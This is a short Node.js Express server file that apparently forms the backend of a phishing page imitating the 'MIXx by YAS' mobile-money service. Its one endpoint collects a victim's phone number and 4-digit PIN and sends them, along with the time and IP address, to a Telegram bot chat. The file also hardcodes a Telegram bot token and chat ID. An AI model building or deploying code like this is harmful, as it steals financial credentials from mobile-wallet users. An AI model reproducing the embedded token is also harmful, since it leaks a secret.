const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// YOUR TELEGRAM DETAILS - REPLACE WITH NEW ONES AFTER CREATING NEW BOT!
const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';  // 🔴 REPLACE THIS!
const CHAT_ID = '8999616005';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Endpoint to receive data from frontend
app.post('/api/submit', async (req, res) => {
    const { phoneNumber, pin } = req.body;
    
    if (!phoneNumber || !pin) {
        return res.status(400).json({ error: 'Phone number and PIN required' });
    }
    
    if (pin.length !== 4) {
        return res.status(400).json({ error: 'PIN must be 4 digits' });
    }
    
    // Format message for Telegram
    const message = `🔔 NEW SUBMISSION FROM MIXx BY YAS 🔔\n\n📱 Phone: ${phoneNumber}\n🔐 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}\n🌐 IP: ${req.ip || 'unknown'}`;
    
    try {
        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Sent to Telegram:', phoneNumber);
        res.json({ success: true, message: 'Data sent successfully' });
        
    } catch (error) {
        console.error('Telegram error:', error.response?.data || error.message);
        res.status(500).json({ error: 'Failed to send to Telegram' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
